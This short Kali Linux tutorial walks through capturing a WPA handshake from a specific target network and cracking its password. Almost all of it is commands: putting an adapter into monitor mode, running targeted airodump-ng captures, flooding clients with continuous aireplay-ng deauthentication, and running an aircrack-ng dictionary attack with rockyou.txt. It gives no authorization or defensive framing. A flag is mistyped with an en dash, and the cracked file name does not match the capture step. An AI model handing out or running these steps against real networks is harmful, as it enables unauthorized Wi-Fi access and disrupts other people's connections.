
# Capturing Handshake (Airmon-ng)

## Step 1: Turn Adapter to Monitor Mode
The critical part is knowing how to use the captured handshake to get the password.

```bash
kali</> sudo airmon-ng check kill
kali</> sudo airmon-ng start wlan0
```

To turn off the monitor mode:
```bash
kali</> sudo airmon-ng stop wlan0
```

## Step 2: Start Analyzing the Networks
To start scanning for available networks:
```bash
kali</> sudo airodump-ng wlan0
```

To analyze a specific network:
```bash
kali</> sudo airodump-ng wlan0 -d C0:49:43:2C:8C:07
```

## Step 3: Capturing the Handshake File
Use the following command to capture the handshake:
```bash
kali</> sudo airodump-ng -w hack1 -c 5 –bssid C0:49:43:2C:8C:07 wlan0
```
Where:
- `-w hack1`: Output file for capturing.
- `-c 5`: Channel.
- `--bssid C0:49:43:2C:8C:07`: Target network's BSSID.
- `wlan0`: Interface.

## Step 4: Deauthentication of a Station to Ensure the Handshake
Before using the command, ensure the channel is set:
```bash
kali</> sudo iwconfig wlan0 channel 5
```

Then deauthenticate a station to capture the handshake:
```bash
kali</> sudo aireplay-ng --deauth 0 -a [BSSID] wlan0
```

## Step 5: Open the Captured File with Wireshark to Verify the Handshake
Open the `.cap` file with Wireshark and search for “eapol”. Scroll down to find the “wpa key data” in the 802.1X Authentication section.

## Step 6: Use Aircrack-ng and the Captured Handshake to Guess the Password
To crack the password using a wordlist:
```bash
kali</> aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```
